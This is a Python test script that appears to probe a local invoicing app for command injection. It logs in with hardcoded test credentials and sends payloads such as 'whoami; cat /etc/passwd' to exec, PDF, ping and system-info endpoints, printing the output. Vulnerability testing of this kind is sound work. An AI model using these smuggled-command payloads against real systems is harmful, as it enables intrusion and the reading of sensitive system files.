#!/usr/bin/env python3
import json
import os
import time
import urllib.parse

import requests
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configuration
BASE_URL = os.getenv("API_URL", "http://localhost:3000")  # Local development server
TIMEOUT = 5  # seconds


def login():
    """Login and get auth token"""
    print("\n[+] Logging in to get auth token")

    try:
        # Login request
        login_data = {"username": "test", "password": "test123"}
        r = requests.post(
            f"{BASE_URL}/api/auth/login", json=login_data, timeout=TIMEOUT
        )
        print(f"[*] Login status: {r.status_code}")

        if r.status_code == 200:
            token = r.json().get("token")
            if token:
                print("[+] Successfully obtained auth token")
                return token

        print("[-] Failed to get auth token")
        return None

    except Exception as e:
        print(f"[-] Error during login: {e}")
        return None


def test_simple_command_injection(token):
    """Test simple command injection using exec"""
    print("\n[+] Testing Simple Command Injection")
    endpoint = f"{BASE_URL}/api/system/exec"
    headers = {"Authorization": f"Bearer {token}"}

    # Test basic command
    command = "whoami"
    r = requests.get(
        endpoint, params={"command": command}, headers=headers, timeout=TIMEOUT
    )
    print(f"[*] Testing basic command: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")

    # Test command injection
    command = "whoami; cat /etc/passwd"
    r = requests.get(
        endpoint, params={"command": command}, headers=headers, timeout=TIMEOUT
    )
    print(f"\n[*] Testing command injection: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")


def test_pdf_command_injection(token):
    """Test command injection in PDF generation"""
    print("\n[+] Testing PDF Command Injection")
    endpoint = f"{BASE_URL}/api/system/pdf"
    headers = {"Authorization": f"Bearer {token}"}

    # Test basic PDF generation
    params = {"template": "template.html", "output": "output.pdf"}
    r = requests.get(endpoint, params=params, headers=headers, timeout=TIMEOUT)
    print(f"[*] Testing basic PDF generation")
    print(f"[*] Status: {r.status_code}")

    # Test command injection
    params = {"template": "template.html; cat /etc/passwd", "output": "output.pdf"}
    r = requests.get(endpoint, params=params, headers=headers, timeout=TIMEOUT)
    print(f"\n[*] Testing command injection in template")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.text}")


def test_ping_command_injection(token):
    """Test command injection in ping command"""
    print("\n[+] Testing Ping Command Injection")
    endpoint = f"{BASE_URL}/api/system/ping"
    headers = {"Authorization": f"Bearer {token}"}

    # Test basic ping
    r = requests.get(
        endpoint, params={"host": "127.0.0.1"}, headers=headers, timeout=TIMEOUT
    )
    print(f"[*] Testing basic ping")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")

    # Test command injection
    command = "127.0.0.1; cat /etc/passwd"
    r = requests.get(
        endpoint, params={"host": command}, headers=headers, timeout=TIMEOUT
    )
    print(f"\n[*] Testing command injection: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")


def test_system_info_injection(token):
    """Test command injection in system info"""
    print("\n[+] Testing System Info Command Injection")
    endpoint = f"{BASE_URL}/api/system/info"
    headers = {"Authorization": f"Bearer {token}"}

    # Test basic system info
    r = requests.get(endpoint, params={"type": "cpu"}, headers=headers, timeout=TIMEOUT)
    print(f"[*] Testing basic system info")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'][:200].strip()}")

    # Test command injection
    command = "cpu; cat /etc/passwd"
    r = requests.get(
        endpoint, params={"type": command}, headers=headers, timeout=TIMEOUT
    )
    print(f"\n[*] Testing command injection: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")


def main():
    print("[+] Command Injection Vulnerability Tests")
    print("[+] Target: Fusion.js Invoicer App")

    try:
        # Login and get auth token
        token = login()

        if not token:
            print("[-] Failed to obtain auth token. Exiting...")
            return

        # Run tests one by one
        test_simple_command_injection(token)
        print("\n[*] Press Enter to continue with PDF injection test...")
        input()
        test_pdf_command_injection(token)
        print("\n[*] Press Enter to continue with ping injection test...")
        input()
        test_ping_command_injection(token)
        print("\n[*] Press Enter to continue with system info injection test...")
        input()
        test_system_info_injection(token)

        print("\n[+] Tests completed")

    except requests.exceptions.Timeout:
        print("[-] Error: Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error connecting to application: {e}")
    except KeyboardInterrupt:
        print("\n[-] Test interrupted by user")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")


if __name__ == "__main__":
    main()
